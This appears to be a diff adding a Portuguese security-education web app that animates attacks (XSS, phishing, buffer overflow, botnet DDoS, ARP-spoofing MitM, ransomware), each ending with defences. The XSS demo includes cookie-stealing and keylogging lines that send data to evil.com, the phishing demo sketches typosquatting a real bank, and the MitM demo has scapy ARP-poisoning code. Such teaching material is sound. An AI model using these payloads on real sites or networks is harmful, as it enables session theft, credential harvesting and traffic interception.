+{t:'&nbsp;&nbsp;<span class="kw">var</span> <span class="var">img</span> = <span class="kw">new</span> <span class="fn">Image</span>()'},
+{t:'&nbsp;&nbsp;<span class="var">img</span>.<span class="var">src</span> = <span class="str">"http://evil.com/steal?c="</span>'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; + <span class="var">document</span>.<span class="var">cookie</span>'},
+{t:'<span class="str">`&lt;/script&gt;`</span>'},
+{t:''},
+{t:'<span class="cm">// Keylogger via XSS</span>'},
+{t:'<span class="var">document</span>.<span class="var">onkeypress</span> = (<span class="var">e</span>) => {'},
+{t:'&nbsp;&nbsp;<span class="fn">fetch</span>(<span class="str">"http://evil.com/log"</span>, {'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">method</span>:<span class="str">"POST"</span>, <span class="var">body</span>:<span class="var">e</span>.<span class="var">key</span>'},
+{t:'&nbsp;&nbsp;})'},
+{t:'}'},
+{t:''},
+{t:'<span class="cm">// ✅ Defesa: sanitização de saída</span>'},
+{t:'<span class="cm">// PHP: htmlspecialchars($in, ENT_QUOTES)</span>'},
+{t:'<span class="cm">// JS: element.textContent = input</span>'},
+{t:'<span class="cm">// Header: Content-Security-Policy</span>'},
+],
+steps:[
+{lines:[],hl:'',lbl:'CENÁRIO',cls:'',txt:'A página exibe o termo pesquisado sem sanitização. Qualquer HTML/JS inserido no campo será renderizado pelo navegador de todos que acessarem a página.'},
+{lines:[3,4,5,6,7,8,9],hl:'hl-red',lbl:'PAYLOAD CONSTRUÍDO',cls:'danger',txt:'O atacante insere a tag <code>&lt;script&gt;</code> no campo de busca. O servidor armazena e devolve sem escapar — o browser da vítima interpreta como código JavaScript legítimo.'},
+{lines:[3,4,5,6,7,8,9],hl:'hl-red',lbl:'DOM INFECTADO',cls:'danger',txt:'A tag script agora faz parte do DOM. Cada usuário que acessar esta página executa automaticamente o código do atacante em seu navegador, no contexto do site legítimo.'},
+{lines:[11,12,13,14,15,16],hl:'hl-red',lbl:'COOKIE CAPTURADO',cls:'danger',txt:'O script dispara uma requisição para evil.com carregando o cookie de sessão. Com esse cookie, o atacante autentica no site como a vítima — <strong>sem precisar da senha</strong>.'},
+{lines:[18,19,20,21],hl:'hl-green',lbl:'DEFESA',cls:'info',txt:'<strong>Nunca use innerHTML com input do usuário.</strong> Use <code>textContent</code> ou sanitize com <code>htmlspecialchars()</code>. O header <code>Content-Security-Policy</code> bloqueia scripts não autorizados mesmo se injetados.'},
+],
+initV(){document.getElementById('vis-area').innerHTML=`<span class="vis-lbl">// ÁRVORE DOM DA PÁGINA //</span><div class="dom-wrap"><span class="dn">&lt;html&gt;</span><span class="dn dn-i1">&lt;head&gt;...&lt;/head&gt;</span><span class="dn dn-i1">&lt;body&gt;</span><span class="dn dn-i2">&lt;h1&gt;Resultados para: "gato"&lt;/h1&gt;</span><span class="dn dn-i2" id="xn">&lt;p&gt;3 resultados encontrados&lt;/p&gt;</span><span class="dn dn-i1">&lt;/body&gt;</span><span class="dn">&lt;/html&gt;</span></div><div class="ck-box" id="xck" style="display:none"></div><div class="exp-box" id="xe"><span class="exp-lbl">AGUARDANDO</span>Clique em NEXT para iniciar.</div>`;},
+updV(s){
+const ex=document.getElementById('xe');if(ex){ex.className='exp-box'+(this.steps[s].cls?' '+this.steps[s].cls:'');ex.innerHTML=`<span class="exp-lbl">${this.steps[s].lbl}</span>${this.steps[s].txt}`;}
+const n=document.getElementById('xn'),ck=document.getElementById('xck');if(!n)return;
+if(s===0){n.textContent='<p>3 resultados encontrados</p>';n.className='dn dn-i2';if(ck)ck.style.display='none';}
+if(s===1){n.textContent='<input value="<scr'+'ipt>img.src=evil+cookie</scr'+'ipt>">';n.className='dn dn-i2';if(ck)ck.style.display='none';}
+if(s===2){n.textContent='<scr'+'ipt>/* PAYLOAD ATIVO */img.src="evil.com?c="+document.cookie</scr'+'ipt>';n.className='dn dn-i2 dn-inj';if(ck)ck.style.display='none';}
+if(s===3&&ck){ck.style.display='block';ck.textContent='🍪 Cookie capturado → sessionid=a3f9b2c1d4e5; auth_token=eyJhbGci... → enviado para evil.com/steal';}
+if(s===4){n.textContent='<p>3 resultados encontrados</p>';n.className='dn dn-i2';if(ck)ck.style.display='none';}
+}},
+
+phish:{title:'Phishing & URL Spoofing',tag:'ENGENHARIA SOCIAL',tagCls:'tag-blue',fname:'phish_builder.py',
+code:[
+{t:'<span class="cm"># Algoritmo de construção de phishing</span>'},
+{t:''},
+{t:'<span class="cm"># 1. Typosquatting — URL com erro sutil</span>'},
+{t:'<span class="var">real</span>  = <span class="str">"bradesco.com.br"</span>'},
+{t:'<span class="var">fake</span>  = <span class="str">"bradesc0.com.br"</span>  <span class="cm"># o → 0</span>'},
+{t:'<span class="var">fake2</span> = <span class="str">"bradesco.com.br.login-seguro.tk"</span>'},
+{t:''},
+{t:'<span class="cm"># 2. Clonar a página legítima</span>'},
+{t:'<span class="var">html</span> = <span class="fn">requests</span>.<span class="fn">get</span>(<span class="var">real</span>).<span class="var">text</span>'},
+{t:'<span class="var">html</span> = <span class="var">html</span>.<span class="fn">replace</span>(<span class="str">\'action="/"\' </span>, <span class="str">f\'action="{fake}"\'</span>)'},
+{t:''},
+{t:'<span class="cm"># 3. Construir e-mail com urgência</span>'},
+{t:'<span class="var">email</span> = {'},
+{t:'&nbsp;&nbsp;<span class="str">"from"</span>: <span class="str">"seguranca@bradesc0.com.br"</span>,'},
+{t:'&nbsp;&nbsp;<span class="str">"subject"</span>: <span class="str">"⚠️ CONTA BLOQUEADA — ação urgente"</span>,'},
+{t:'&nbsp;&nbsp;<span class="str">"deadline"</span>: <span class="str">"Regularize em 24h ou perca acesso"</span>,'},
+{t:'&nbsp;&nbsp;<span class="str">"link"</span>: <span class="str">"https://bit.ly/3xRf..."</span>'},
+{t:'}'},
+{t:''},
+{t:'<span class="cm"># 4. Capturar credenciais</span>'},
+{t:'<span class="kw">def</span> <span class="fn">harvest</span>(<span class="var">req</span>):'},
+{t:'&nbsp;&nbsp;<span class="var">log</span>.<span class="fn">write</span>(<span class="var">req</span>.<span class="var">form</span>[<span class="str">"password"</span>])'},
+],
+steps:[
+{lines:[],hl:'',lbl:'CENÁRIO',cls:'',txt:'O phishing combina falsificação técnica com manipulação psicológica. Cada elemento é projetado para parecer legítimo e eliminar a desconfiança da vítima.'},
+{lines:[3,4,5],hl:'hl-amber',lbl:'TYPOSQUATTING',cls:'warn',txt:'A URL falsa muda apenas um caractere: <code>bradesc<strong>0</strong>.com.br</code> (zero no lugar do "o"). O olho humano não percebe de imediato, especialmente sob pressão psicológica.'},
+{lines:[8,9,10],hl:'hl-amber',lbl:'CLONE DA PÁGINA',cls:'warn',txt:'O atacante baixa o HTML do site real e substitui apenas o <code>action</code> do formulário. A vítima vê a página idêntica à original — logo, cores, layout, tudo igual.'},
+{lines:[12,13,14,15,16,17,18],hl:'hl-red',lbl:'E-MAIL ARMADO',cls:'danger',txt:'Urgência artificial (<strong>"24 horas"</strong>), ameaça (<strong>"perca o acesso"</strong>) e link encurtado que esconde o destino. O cérebro em pânico não analisa — age por impulso.'},
+{lines:[20,21,22],hl:'hl-green',lbl:'DEFESA',cls:'info',txt:'<strong>Passe o mouse sobre links</strong> antes de clicar. Bancos NUNCA pedem senha por e-mail. Em dúvida: feche o e-mail e acesse o site <strong>digitando o endereço manualmente</strong>.'},
+],
+initV(){document.getElementById('vis-area').innerHTML=`<span class="vis-lbl">// E-MAIL SENDO CONSTRUÍDO //</span><div class="em-wrap"><div class="em-hdr"><div class="ef"><span class="ef-l">DE:</span><span class="ef-v" id="pf">seguranca@banco.com.br</span></div><div class="ef"><span class="ef-l">PARA:</span><span class="ef-v">voce@empresa.com</span></div><div class="ef"><span class="ef-l">ASSUNTO:</span><span class="ef-v" id="ps">Aviso de segurança</span></div></div><div class="em-body" id="pb">Prezado cliente,<br><br>Identificamos uma atividade em sua conta.<br><br><span id="pl"><a class="elink" href="#">Acesse sua conta aqui</a></span></div></div><div class="exp-box" id="pe"><span class="exp-lbl">AGUARDANDO</span>Clique em NEXT para iniciar.</div>`;},
+updV(s){
+const ex=document.getElementById('pe');if(ex){ex.className='exp-box'+(this.steps[s].cls?' '+this.steps[s].cls:'');ex.innerHTML=`<span class="exp-lbl">${this.steps[s].lbl}</span>${this.steps[s].txt}`;}
+const f=document.getElementById('pf'),sj=document.getElementById('ps'),bd=document.getElementById('pb'),lk=document.getElementById('pl');if(!f)return;
+const st=[
+{f:'seguranca@banco.com.br',fc:'ef-v',s:'Aviso de segurança',b:'Prezado cliente,<br><br>Identificamos uma atividade em sua conta.<br><br>',l:'<a class="elink" href="#">Acesse sua conta aqui</a>'},
+{f:'seguranca@bradesc0.com.br',fc:'ef-s',s:'Aviso de segurança',b:'Prezado cliente,<br><br>Identificamos uma atividade em sua conta.<br><br>',l:'<a class="elink" href="#">Acesse sua conta aqui</a>'},
+{f:'seguranca@bradesc0.com.br',fc:'ef-s',s:'Aviso de segurança',b:'Prezado cliente,<br><br>Acesse o link abaixo para atualizar seus dados:<br><br>',l:'<a class="elink-fake" href="#">https://bradesco.com.br.login-seguro.tk/atualizar</a>'},
+{f:'seguranca@bradesc0.com.br',fc:'ef-s',s:'⚠️ CONTA BLOQUEADA — Ação urgente!',b:'Prezado cliente,<br><br>Sua conta foi <strong style="color:var(--red)">BLOQUEADA</strong>. Regularize em <strong style="color:var(--red)">24 horas</strong> ou perderá o acesso permanentemente.<br><br>',l:'<a class="elink-fake" href="#">🔗 Regularizar agora (link encurtado)</a>'},
+{f:'seguranca@bradesc0.com.br',fc:'ef-s',s:'⚠️ CONTA BLOQUEADA — Ação urgente!',b:'<span style="color:var(--text3)">↑ E-mail de phishing completo.<br>Nunca clique em links assim!</span>',l:''},
+];
+const d=st[s]||st[0];f.textContent=d.f;f.className=d.fc;sj.textContent=d.s;bd.innerHTML=d.b;lk.innerHTML=d.l;
+}},
+
+buffer:{title:'Buffer Overflow',tag:'EXPLORAÇÃO DE MEMÓRIA',tagCls:'tag-red',fname:'buffer_overflow.c',
+code:[
+{t:'<span class="cm">// Função vulnerável em C</span>'},
+{t:'<span class="kw">void</span> <span class="fn">login</span>(<span class="kw">char</span> *<span class="var">input</span>) {'},
+{t:'&nbsp;&nbsp;<span class="kw">char</span> <span class="var">buffer</span>[<span class="num">16</span>]; <span class="cm">// apenas 16 bytes</span>'},
+{t:'&nbsp;&nbsp;<span class="fn">strcpy</span>(<span class="var">buffer</span>, <span class="var">input</span>); <span class="cm">// ❌ sem limite!</span>'},
+{t:'}'},
+{t:''},
+{t:'<span class="cm">// Payload do atacante (28 bytes):</span>'},
+{t:'<span class="var">payload</span> = ('},
+{t:'&nbsp;&nbsp;<span class="str">"AAAAAAAAAAAAAAAA"</span>  <span class="cm">// 16B → preenche buffer</span>'},
+{t:'&nbsp;&nbsp;<span class="str">+ "\\x41\\x41\\x41\\x41"</span>  <span class="cm">// 4B → sobrescreve EBP</span>'},
+{t:'&nbsp;&nbsp;<span class="str">+ "\\xef\\xbe\\xad\\xde"</span>  <span class="cm">// 4B → novo ret address!</span>'},
+{t:'&nbsp;&nbsp;<span class="str">+ shellcode</span>            <span class="cm">// código malicioso</span>'},
+{t:')'},
+{t:''},
+{t:'<span class="cm">// ✅ Defesa: strncpy + ASLR + DEP</span>'},
+{t:'<span class="fn">strncpy</span>(<span class="var">buffer</span>,<span class="var">input</span>,<span class="kw">sizeof</span>(<span class="var">buffer</span>)-<span class="num">1</span>);'},
+{t:'<span class="cm">// ASLR: randomiza endereços de memória</span>'},
+{t:'<span class="cm">// DEP/NX: pilha não-executável</span>'},
+{t:'<span class="cm">// Stack Canaries: detecta overflow</span>'},
+],
+steps:[
+{lines:[2,3,4],hl:'hl-amber',lbl:'FUNÇÃO VULNERÁVEL',cls:'warn',txt:'O buffer tem <strong>16 bytes</strong> e <code>strcpy()</code> não verifica o tamanho do input. Mais de 16 bytes escreve em áreas adjacentes da memória — comportamento indefinido e perigoso.'},
+{lines:[2,3],hl:'hl-green',lbl:'MEMÓRIA NORMAL',cls:'',txt:'Input legítimo (8 chars): cabe no buffer, EBP e endereço de retorno intactos. O programa funciona normalmente e retorna para o endereço correto.'},
+{lines:[8,9],hl:'hl-amber',lbl:'BUFFER CHEIO',cls:'warn',txt:'16 bytes de "AAAA..." preenchem exatamente o buffer. No limite — ainda não causou dano. Mas o próximo byte já invade a área do EBP salvo.'},
+{lines:[9,10],hl:'hl-red',lbl:'EBP CORROMPIDO',cls:'danger',txt:'4 bytes extras sobrescrevem o <strong>EBP salvo</strong> (base pointer). O programa perde referência da pilha. Erros de segmentação ou comportamento imprevisível.'},
+{lines:[10,11,12],hl:'hl-red',lbl:'ENDEREÇO DE RETORNO HIJACKED',cls:'danger',txt:'4 bytes finais sobrescrevem o <strong>endereço de retorno</strong>. Quando a função terminar, salta para o shellcode do atacante. <strong>Execução de código arbitrário.</strong>'},
+{lines:[15,16,17,18,19],hl:'hl-green',lbl:'DEFESA EM CAMADAS',cls:'info',txt:'<strong>strncpy</strong> limita a cópia. <strong>ASLR</strong> randomiza endereços — atacante não sabe para onde saltar. <strong>DEP/NX</strong> torna a pilha não-executável. <strong>Stack Canaries</strong> detectam overflow antes do retorno.'},
+],
+initV(){
+document.getElementById('vis-area').innerHTML=`<span class="vis-lbl">// LAYOUT DA STACK //</span><div class="mem-tbl" id="mt"><span class="mem-addr">0xffff0020</span><div class="mem-cv" id="mc-r">endereço de retorno</div><span class="mem-addr">0xffff001c</span><div class="mem-cv" id="mc-e">EBP salvo</div><span class="mem-addr">0xffff0010</span><div class="mem-cv" id="mc-b">buffer[16]: vazio</div></div><span class="vis-lbl">// BYTES DO BUFFER //</span><div class="mbytes" id="mbs">${Array(20).fill(0).map((_,i)=>`<div class="mb" id="mb${i}">00</div>`).join('')}</div><div class="exp-box" id="be2"><span class="exp-lbl">AGUARDANDO</span>Clique em NEXT para iniciar.</div>`;},
+updV(s){
+const ex=document.getElementById('be2');if(ex){ex.className='exp-box'+(this.steps[s].cls?' '+this.steps[s].cls:'');ex.innerHTML=`<span class="exp-lbl">${this.steps[s].lbl}</span>${this.steps[s].txt}`;}
+for(let i=0;i<20;i++){const m=document.getElementById('mb'+i);if(m){m.className='mb';m.textContent='00';}}
+const r=document.getElementById('mc-r'),e=document.getElementById('mc-e'),b=document.getElementById('mc-b');if(!r)return;
+r.className='mem-cv';r.textContent='endereço de retorno';e.className='mem-cv';e.textContent='EBP salvo';b.className='mem-cv';b.textContent='buffer[16]: vazio';
+if(s===1){for(let i=0;i<8;i++){const m=document.getElementById('mb'+i);if(m){m.className='mb mb-ok';m.textContent='75';}}b.className='mem-cv mc-ok';b.textContent='buffer: "usuario1" ✅';}
+if(s===2){for(let i=0;i<16;i++){const m=document.getElementById('mb'+i);if(m){m.className='mb mb-ok';m.textContent='41';}}b.className='mem-cv mc-warn';b.textContent='buffer[16]: CHEIO ⚠️';}
+if(s===3){for(let i=0;i<16;i++){const m=document.getElementById('mb'+i);if(m){m.className='mb mb-ok';m.textContent='41';}}for(let i=16;i<20;i++){const m=document.getElementById('mb'+i);if(m){m.className='mb mb-over';m.textContent='41';}}b.className='mem-cv mc-warn';b.textContent='buffer: OVERFLOW';e.className='mem-cv mc-over';e.textContent='EBP: ⚠️ CORROMPIDO!';}
+if(s===4){for(let i=0;i<16;i++){const m=document.getElementById('mb'+i);if(m){m.className='mb mb-ok';m.textContent='41';}}for(let i=16;i<20;i++){const m=document.getElementById('mb'+i);if(m){m.className='mb mb-over';m.textContent='41';}}b.className='mem-cv mc-warn';b.textContent='buffer: OVERFLOW';e.className='mem-cv mc-over';e.textContent='EBP: ⚠️ CORROMPIDO!';r.className='mem-cv mc-inj';r.textContent='RETORNO → 0xDEADBEEF (shellcode) 💀';}
+if(s===5){for(let i=0;i<16;i++){const m=document.getElementById('mb'+i);if(m){m.className='mb mb-ok';m.textContent='41';}}b.className='mem-cv mc-ok';b.textContent='buffer: protegido ✅';e.className='mem-cv mc-ok';e.textContent='EBP: intacto ✅';r.className='mem-cv mc-ok';r.textContent='retorno: endereço original ✅';}
+}},
+
+ddos:{title:'DDoS / Botnet Attack',tag:'NEGAÇÃO DE SERVIÇO',tagCls:'tag-red',fname:'ddos_botnet.py',
+code:[
+{t:'<span class="cm"># C2 — Command & Control server</span>'},
+{t:'<span class="kw">import</span> <span class="var">socket</span>, <span class="var">threading</span>'},
+{t:''},
+{t:'<span class="var">botnet</span> = []  <span class="cm"># IPs comprometidos</span>'},
+{t:''},
+{t:'<span class="cm"># Recrutar via malware/phishing</span>'},
+{t:'<span class="kw">def</span> <span class="fn">infect</span>(<span class="var">host</span>):'},
+{t:'&nbsp;&nbsp;<span class="fn">install_backdoor</span>(<span class="var">host</span>)'},
+{t:'&nbsp;&nbsp;<span class="var">botnet</span>.<span class="fn">append</span>(<span class="var">host</span>)'},
+{t:''},
+{t:'<span class="cm"># Loop de flood (loop infinito)</span>'},
+{t:'<span class="kw">def</span> <span class="fn">flood</span>(<span class="var">target</span>, <span class="var">port</span>):'},
+{t:'&nbsp;&nbsp;<span class="kw">while</span> <span class="kw">True</span>:'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">s</span> = <span class="var">socket</span>.<span class="fn">socket</span>()'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">s</span>.<span class="fn">connect</span>((<span class="var">target</span>, <span class="var">port</span>))'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">s</span>.<span class="fn">send</span>(<span class="str">b"GET / HTTP/1.1\\r\\n"</span> * <span class="num">9999</span>)'},
+{t:''},
+{t:'<span class="cm"># Disparar todos os zumbis</span>'},
+{t:'<span class="kw">def</span> <span class="fn">launch</span>(<span class="var">target</span>):'},
+{t:'&nbsp;&nbsp;<span class="kw">for</span> <span class="var">bot</span> <span class="kw">in</span> <span class="var">botnet</span>:'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">t</span>=<span class="var">threading</span>.<span class="fn">Thread</span>(<span class="var">target</span>=<span class="fn">flood</span>,<span class="var">args</span>=(<span class="var">target</span>,<span class="num">80</span>))'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">t</span>.<span class="fn">start</span>() <span class="cm"># todos simultâneos!</span>'},
+],
+steps:[
+{lines:[],hl:'',lbl:'CENÁRIO',cls:'',txt:'Um DDoS usa dezenas de milhares de dispositivos comprometidos para sobrecarregar um alvo. O atacante controla todos via servidor C2 (Command & Control).'},
+{lines:[6,7,8,9],hl:'hl-red',lbl:'RECRUTAMENTO',cls:'warn',txt:'Dispositivos são comprometidos via malware. O backdoor fica aguardando ordens silenciosamente — CPU e rede normais para o dono. Câmeras IP e roteadores desatualizados são alvos fáceis.'},
+{lines:[6,7,8,9],hl:'hl-red',lbl:'PROPAGAÇÃO',cls:'danger',txt:'O bot se replica buscando outros dispositivos vulneráveis. Em horas, centenas são recrutados. A botnet Mirai chegou a recrutar 600.000 dispositivos IoT em 2016.'},
+{lines:[11,12,13,14,15,16],hl:'hl-red',lbl:'FUNÇÃO DE FLOOD',cls:'danger',txt:'Cada zumbi executa loop infinito: abre conexões TCP e envia requisições gigantes. Um único bot gera centenas de conexões/segundo. 10.000 bots = milhões de requisições/segundo.'},
+{lines:[18,19,20,21,22],hl:'hl-red',lbl:'ATAQUE LANÇADO',cls:'danger',txt:'Todos os zumbis disparam simultaneamente. O servidor não distingue tráfego legítimo do malicioso — fica sem recursos e cai para todos os usuários reais.'},
+{lines:[],hl:'',lbl:'DEFESA',cls:'info',txt:'<strong>CDN + Scrubbing Centers</strong> (Cloudflare, Akamai) absorvem e filtram o tráfego antes de chegar ao servidor. <strong>Rate limiting</strong> bloqueia IPs abusivos. <strong>Anycast</strong> distribui o ataque globalmente.'},
+],
+initV(){document.getElementById('vis-area').innerHTML=`<span class="vis-lbl">// MAPA DA BOTNET //</span><div class="bot-grid">${Array(24).fill(0).map((_,i)=>`<div class="bot b-idle" id="bt${i}">💻</div>`).join('')}</div><div class="net-row"><div class="nnode" id="dt">🎯 Alvo</div></div><div class="load-lbl" id="dl">Carga: 0%</div><div class="prog-t" style="margin-bottom:10px"><div class="prog-f" id="db" style="width:0%;background:var(--red)"></div></div><div class="exp-box" id="de"><span class="exp-lbl">AGUARDANDO</span>Clique em NEXT para iniciar.</div>`;},
+updV(s){
+const ex=document.getElementById('de');if(ex){ex.className='exp-box'+(this.steps[s].cls?' '+this.steps[s].cls:'');ex.innerHTML=`<span class="exp-lbl">${this.steps[s].lbl}</span>${this.steps[s].txt}`;}
+if(tmr){clearInterval(tmr);tmr=null;}
+for(let i=0;i<24;i++){const b=document.getElementById('bt'+i);if(b)b.className='bot b-idle';}
+const tgt=document.getElementById('dt'),bar=document.getElementById('db'),lbl=document.getElementById('dl');
+if(!tgt)return;
+tgt.className='nnode';bar.style.width='0%';bar.style.background='var(--red)';if(lbl)lbl.textContent='Carga: 0%';
+if(s===1){for(let i=0;i<6;i++){const b=document.getElementById('bt'+i);if(b)b.className='bot b-inf';}}
+if(s===2){for(let i=0;i<18;i++){const b=document.getElementById('bt'+i);if(b)b.className='bot b-inf';}}
+if(s===3){for(let i=0;i<18;i++){const b=document.getElementById('bt'+i);if(b)b.className='bot b-fire';}tgt.className='nnode nn-atk';bar.style.width='55%';if(lbl)lbl.textContent='Carga: 55% ⚠️';}
+if(s===4){for(let i=0;i<18;i++){const b=document.getElementById('bt'+i);if(b)b.className='bot b-fire';}tgt.className='nnode nn-atk';let ld=55;tmr=setInterval(()=>{ld=Math.min(100,ld+Math.random()*4);if(bar)bar.style.width=ld+'%';if(lbl)lbl.textContent='Carga: '+Math.round(ld)+'% — '+(ld>90?'⚠️ SERVIDOR FORA DO AR!':'⚠️ Degradado');},400);}
+if(s===5){for(let i=0;i<18;i++){const b=document.getElementById('bt'+i);if(b)b.className='bot b-idle';}tgt.className='nnode nn-def';bar.style.width='8%';bar.style.background='var(--green)';if(lbl)lbl.textContent='✅ Tráfego filtrado — servidor protegido';}
+}},
+
+mitm:{title:'Man in the Middle (MitM)',tag:'INTERCEPTAÇÃO',tagCls:'tag-purple',fname:'mitm_arp_poison.py',
+code:[
+{t:'<span class="cm"># ARP Poisoning — envenenar tabela ARP</span>'},
+{t:'<span class="kw">from</span> <span class="var">scapy</span>.<span class="var">all</span> <span class="kw">import</span> *'},
+{t:''},
+{t:'<span class="cm"># Enganar vítima: "eu sou o gateway"</span>'},
+{t:'<span class="kw">def</span> <span class="fn">poison</span>(<span class="var">victim_ip</span>, <span class="var">gw_ip</span>):'},
+{t:'&nbsp;&nbsp;<span class="var">pkt</span> = <span class="fn">ARP</span>('},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">op</span>=<span class="num">2</span>,            <span class="cm"># ARP reply</span>'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">pdst</span>=<span class="var">victim_ip</span>,<span class="cm"># envia para vítima</span>'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">psrc</span>=<span class="var">gw_ip</span>,    <span class="cm"># "sou o gateway"</span>'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="var">hwsrc</span>=<span class="var">atk_mac</span>  <span class="cm"># meu MAC</span>'},
+{t:'&nbsp;&nbsp;)'},
+{t:'&nbsp;&nbsp;<span class="fn">send</span>(<span class="var">pkt</span>, <span class="var">verbose</span>=<span class="kw">False</span>)'},
+{t:''},
+{t:'<span class="cm"># Interceptar e repassar pacotes</span>'},
+{t:'<span class="kw">def</span> <span class="fn">intercept</span>(<span class="var">pkt</span>):'},
+{t:'&nbsp;&nbsp;<span class="kw">if</span> <span class="var">pkt</span>.<span class="fn">haslayer</span>(<span class="var">Raw</span>):'},
+{t:'&nbsp;&nbsp;&nbsp;&nbsp;<span class="fn">capturar</span>(<span class="var">pkt</span>[<span class="var">Raw</span>].<span class="var">load</span>)'},
+{t:'&nbsp;&nbsp;<span class="fn">repassar</span>(<span class="var">pkt</span>) <span class="cm"># vítima não percebe</span>'},
+{t:''},
+{t:'<span class="fn">sniff</span>(<span class="var">prn</span>=<span class="fn">intercept</span>, <span class="var">store</span>=<span class="num">0</span>)'},
+],
+steps:[
+{lines:[],hl:'',lbl:'CENÁRIO',cls:'',txt:'Na rede local, computadores usam ARP para descobrir o MAC de um IP. O ARP não tem autenticação — qualquer um pode enviar respostas falsas e redirecionar o tráfego.'},
+{lines:[4,5,6,7,8,9,10,11,12],hl:'hl-amber',lbl:'ARP POISONING',cls:'warn',txt:'O atacante envia ARP falso para a vítima ("o gateway está no meu MAC") e para o gateway ("a vítima está no meu MAC"). Ambos atualizam suas tabelas ARP com o endereço do atacante.'},
+{lines:[14,15,16,17,18],hl:'hl-red',lbl:'ATACANTE NO MEIO',cls:'danger',txt:'Todo tráfego da vítima passa pelo atacante antes de ir ao gateway — e vice-versa. A comunicação parece normal para ambos os lados, mas o atacante está lendo tudo.'},
+{lines:[14,15,16,17,18],hl:'hl-red',lbl:'CAPTURA ATIVA',cls:'danger',txt:'Senhas, cookies, dados bancários — visíveis em texto claro sem criptografia. O atacante pode também <strong>modificar os dados</strong> antes de repassar, injetando conteúdo malicioso.'},
+{lines:[],hl:'',lbl:'DEFESA',cls:'info',txt:'<strong>HTTPS/TLS</strong> criptografa — mesmo interceptados, dados são ilegíveis. <strong>HSTS</strong> força HTTPS impedindo SSL Stripping. <strong>VPN</strong> cria túnel criptografado que impede a interceptação.'},
+],
+initV(){document.getElementById('vis-area').innerHTML=`<span class="vis-lbl">// FLUXO DE COMUNICAÇÃO //</span><div class="net-row"><div class="nnode nn-ok">💻 Cliente</div><div class="narr" id="ma1">→</div><div class="nnode" id="mat">👤 ?</div><div class="narr" id="ma2">→</div><div class="nnode nn-ok">🌐 Servidor</div></div><div class="pkt-list" id="mp"></div><div class="exp-box" id="me"><span class="exp-lbl">AGUARDANDO</span>Clique em NEXT para iniciar.</div>`;},
+updV(s){
+const ex=document.getElementById('me');if(ex){ex.className='exp-box'+(this.steps[s].cls?' '+this.steps[s].cls:'');ex.innerHTML=`<span class="exp-lbl">${this.steps[s].lbl}</span>${this.steps[s].txt}`;}
+const at=document.getElementById('mat'),a1=document.getElementById('ma1'),a2=document.getElementById('ma2'),pk=document.getElementById('mp');
+if(!at)return;at.className='nnode';at.textContent='👤 ?';a1.className='narr';a1.textContent='→';a2.className='narr';a2.textContent='→';if(pk)pk.innerHTML='';
+if(s===1){at.className='nnode nn-atk';at.textContent='⚠️ Atacante';if(pk)pk.innerHTML='<div class="pkt pkt-int"><span>ARP: "Gateway está em AA:BB:CC... (MAC atacante)"</span><span style="color:var(--red);font-size:0.6rem">FALSO</span></div>';}
+if(s>=2){at.className='nnode nn-mid';at.textContent='👤 ATACANTE';a1.className='narr na-atk';a2.className='narr na-atk';}
+if(s===3&&pk){pk.innerHTML=[['POST /login — user=joao&pass=minha_senha123','CAPTURADO'],['Cookie: session=a3f9b2c1','CAPTURADO'],['GET /saldo → repassado','—'],['Resposta: saldo=R$45.000 → R$0','ALTERADO']].map(([d,st])=>`<div class="pkt pkt-int"><span>${d}</span><span style="font-size:0.6rem;color:var(--red)">${st}</span></div>`).join('');}
+if(s===4){at.className='nnode nn-def';at.textContent='🚫 Bloqueado';a1.className='narr na-blk';a1.textContent='🔒';a2.className='narr na-blk';a2.textContent='🔒';if(pk)pk.innerHTML='<div class="pkt"><span>TLS: dados criptografados — ilegíveis ✅</span></div>';}
+}},
+
+ransom:{title:'Ransomware — Ciclo Completo',tag:'SEQUESTRO DE DADOS',tagCls:'tag-amber',fname:'ransomware_cycle.py',
+code:[
+{t:'<span class="cm"># Ciclo completo do ransomware moderno</span>'},
+{t:''},
+{t:'<span class="cm"># 1. Infiltração via phishing/exploit</span>'},
+{t:'<span class="fn">install_backdoor</span>(); <span class="fn">disable_AV</span>()'},
+{t:''},
+{t:'<span class="cm"># 2. Movimento lateral na rede</span>'},
+{t:'<span class="kw">for</span> <span class="var">host</span> <span class="kw">in</span> <span class="fn">scan_network</span>():'},
+{t:'&nbsp;&nbsp;<span class="fn">lateral_move</span>(<span class="var">host</span>)'},
+{t:''},
+{t:'<span class="cm"># 3. Exfiltrar dados (dupla extorsão)</span>'},
+{t:'<span class="kw">for</span> <span class="var">f</span> <span class="kw">in</span> <span class="fn">find_valuable</span>():'},
+{t:'&nbsp;&nbsp;<span class="fn">upload_to_c2</span>(<span class="var">f</span>)'},
+{t:''},
+{t:'<span class="cm"># 4. Gerar chave e criptografar</span>'},
+{t:'<span class="var">key</span> = <span class="fn">RSA_generate</span>(<span class="num">4096</span>)'},
+{t:'<span class="kw">for</span> <span class="var">file</span> <span class="kw">in</span> <span class="fn">get_all_files</span>():'},
+{t:'&nbsp;&nbsp;<span class="fn">AES_encrypt</span>(<span class="var">file</span>, <span class="var">key</span>)'},
+{t:'&nbsp;&nbsp;<span class="fn">rename</span>(<span class="var">file</span>, <span class="var">file</span>+<span class="str">".locked"</span>)'},
+{t:''},
+{t:'<span class="cm"># 5. Exigir resgate</span>'},
+{t:'<span class="fn">drop_ransom_note</span>(<span class="str">"README_DECRYPT.txt"</span>)'},
+{t:'<span class="fn">show_countdown</span>(<span class="var">hours</span>=<span class="num">72</span>)'},
+],
+steps:[
+{lines:[],hl:'',lbl:'CENÁRIO',cls:'',txt:'O ransomware moderno opera em múltiplas fases silenciosas antes de se revelar. A criptografia é a fase final — quando a vítima percebe, o atacante já tem todos os dados.'},
